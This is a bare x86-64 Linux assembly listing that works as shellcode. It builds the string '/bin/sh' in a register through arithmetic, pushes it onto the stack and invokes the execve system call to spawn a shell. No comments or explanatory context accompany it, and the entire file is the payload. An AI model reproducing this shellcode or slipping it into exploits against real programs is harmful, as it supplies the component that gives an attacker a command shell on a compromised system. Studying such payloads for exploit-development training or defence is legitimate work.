section .text
global _start
_start:
    add rax, 0x68732f6e
    add rbx, 0x1000000
    mul rbx
    add rax, 0x69622f
    push rax

    push rsp
    pop rdi

    xor rax, rax
    add rax, 59
    syscall
